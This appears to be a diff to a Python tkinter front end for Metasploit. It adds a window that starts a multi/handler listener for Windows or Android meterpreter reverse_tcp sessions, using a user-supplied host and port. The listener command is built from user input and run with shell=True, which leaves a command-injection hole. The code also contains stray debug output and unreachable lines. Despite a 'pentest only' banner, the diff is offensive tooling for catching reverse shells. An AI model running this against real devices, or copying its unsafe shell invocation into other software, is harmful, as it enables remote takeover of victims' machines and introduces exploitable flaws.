@@ -3,6 +3,7 @@ import time
 import os
 import socket
 import tkinter as tk
+import pexpect
 
 #########################################################
 # CREATED TO VULNERABILITY AND PENTEST ENVIRONMENT ONLY #
@@ -30,7 +31,7 @@ def init():
 	window.resizable(False, False)
 
 	def on_closing():
-		pass
+		exit()
 
 	window.protocol("WM_DELETE_WINDOW", on_closing)
 
@@ -40,7 +41,7 @@ def init():
 	tk.Label(window).pack()
 	tk.Label(window).pack()
 	tk.Button(window, text="Create Payload", command=venomCreate, width=40, height=2).pack(pady=10, anchor="center", fill="none")
-	tk.Button(window, text="Start Msfconsole", width=40, height=2).pack(pady=10, anchor="center", fill="none")
+	tk.Button(window, text="Start Client", command=msfStart, width=40, height=2).pack(pady=10, anchor="center", fill="none")
 	tk.Button(window, text="Exit", command=exitApp, width=40, height=2).pack(pady=10, anchor="center", fill="none")
 
 
@@ -152,7 +153,76 @@ def venomCreate():
 
 
 # START MSFCONSOLE
-def msfStart(lhost, lport, payload):
+def msfStart():
+
+	window = tk.Tk()
+	window.title(app_title + " - Client")
+	window.geometry("500x520")
+	window.resizable(False, False)
+
+	tk.Label(window).pack()
+	tk.Label(window).pack()
+	tk.Label(window, text="MSF Creator - Client", font=("arial", 24, "bold")).pack()
+	tk.Label(window).pack()
+	tk.Label(window).pack()
+
+	tk.Label(window, text="Select the OS").pack()
+	# Opções para o dropdown
+	options = ["Windows", "Android"]
+	# Cria a variável que será usada para armazenar a opção selecionada
+	selected_option = tk.StringVar(window)
+	# Define o valor padrão da variável como a primeira opção
+	selected_option.set(options[0])
+	# Cria o OptionMenu e o associa à variável
+	optionmenu = tk.OptionMenu(window, selected_option, *options)
+	optionmenu.config(width=40)
+	optionmenu.config(height=2)
+	optionmenu.pack()
+	tk.Label(window).pack()
+
+	# HOST
+	tk.Label(window, text="Set the Host (Your Local IP is "+ip_address+")").pack()
+	input_host = tk.Entry(window, width=27, font=("Arial", 18))
+	input_host.insert(tk.END, ip_address)
+	input_host.pack()
+	tk.Label(window).pack()
+
+	# PORT
+	tk.Label(window, text="Set the Port:").pack()
+	input_port = tk.Entry(window, width=27, font=("Arial", 18))
+	input_port.insert(tk.END, "7777")
+	input_port.pack()
+	tk.Label(window).pack()
+
+
+	def hacking():
+		pl_option = selected_option.get()
+		if pl_option == "Windows":
+			payload = "windows/meterpreter/reverse_tcp"
+		elif pl_option == "Android":
+			print("a")
+			payload = "android/meterpreter/reverse_tcp"
+
+		lhost = input_host.get()
+		lport = input_port.get()
+
+		msf_cmd = 'msfconsole -q -x "use exploit/multi/handler; set PAYLOAD {}; set LHOST {}; set LPORT {}; run"'.format(payload, lhost, lport)
+		result = subprocess.run(msf_cmd, shell=True, stdout=subprocess.PIPE)
+		print(result.stdout.decode('utf-8'))
+
+
+		
+
+
+
+
+	tk.Button(window, text="Wait for Client Connection", width=40, height=2, command=hacking).pack()
+
+
+
+	window.mainloop()
+	exit()
+
 	print("Initializate MsfConsole with configuration set? [y/n]")
 	opt = input("> ")
 	if opt == "y":
